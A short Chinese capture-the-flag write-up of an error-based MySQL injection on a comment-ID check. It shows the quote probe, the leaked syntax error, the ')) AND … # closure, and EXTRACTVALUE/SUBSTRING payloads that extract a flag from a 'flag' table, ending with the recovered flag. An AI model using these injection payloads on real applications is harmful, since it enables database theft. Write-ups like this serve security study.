正常输入`1`，显示:
```
该comment id已被占用
```
尝试输入`1'`，语法报错如下:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')) LIMIT 0,1' at line 1该comment id未被占用
```
得知攻击命令应为：
```
1')) AND <command> #
```

尝试使用EXTRACTVALUE进行注入攻击，构造如下
```
1')) AND EXTRACTVALUE(1, (SELECT flag FROM flag WHERE 1=1)) #
```

返回被截断的FLAG
```
{30cc25d9656945abb3535a184d8397c
```

尝试分段提取FLAG
```
1')) AND EXTRACTVALUE(1, (SELECT SUBSTRING(flag, 1, 30) FROM flag WHERE 1=1)) #
1')) AND EXTRACTVALUE(1, (SELECT SUBSTRING(flag, 10, 30) FROM flag WHERE 1=1)) #
```

```
{30cc25d9656945abb3535a184
d9656945abb3535a184d8397c5}
```

完整FLAG为：
```
NeSE{30cc25d9656945abb3535a184d8397c5}
```